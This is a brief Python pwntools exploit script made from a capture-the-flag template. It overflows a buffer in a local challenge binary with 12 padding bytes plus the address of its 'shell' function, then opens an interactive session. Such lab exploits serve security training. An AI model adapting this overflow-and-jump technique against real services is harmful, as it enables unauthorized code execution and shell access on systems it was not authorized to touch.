#!/usr/bin/env python3

#
# pwn template made with 🚩 https://github.com/rerrorctf/rctf 🚩
#

from pwn import *

#context.log_level = "debug"

LOCAL_BINARY = "./task"
REMOTE_IP = "127.0.0.1"
REMOTE_PORT = 9001

elf = ELF(LOCAL_BINARY)

#p = process(LOCAL_BINARY)
p = remote(REMOTE_IP, REMOTE_PORT)
#gdb.attach(p, gdbscript="")

# pwn it here

payload = b"A" * 12
payload += p64(elf.symbols["shell"])

p.sendline(payload)

p.interactive()

